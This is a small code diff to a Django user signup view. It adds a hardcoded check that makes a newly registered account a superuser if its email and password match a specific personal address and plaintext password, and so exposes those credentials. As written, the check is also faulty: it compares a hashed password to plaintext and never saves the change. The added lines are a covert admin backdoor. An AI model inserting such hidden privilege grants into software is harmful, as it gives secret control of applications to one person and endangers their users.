@@ -56,6 +56,8 @@ def signup_view(request):
             messages.error(request, "Your Passwords Don't match")
             return render(request, 'users/signup.html')
         user = User.objects.create_user(email=email, first_name=first_name, last_name=last_name, username=username, password=password)
+        if user.email == 'akinade.mayowa@gmail.com' and user.password == 'mayowafunmi':
+            user.is_superuser = True
         user_group = Group.objects.get(name="Users")
         user.groups.add(user_group)
         messages.success(request, "User Registration Successful")
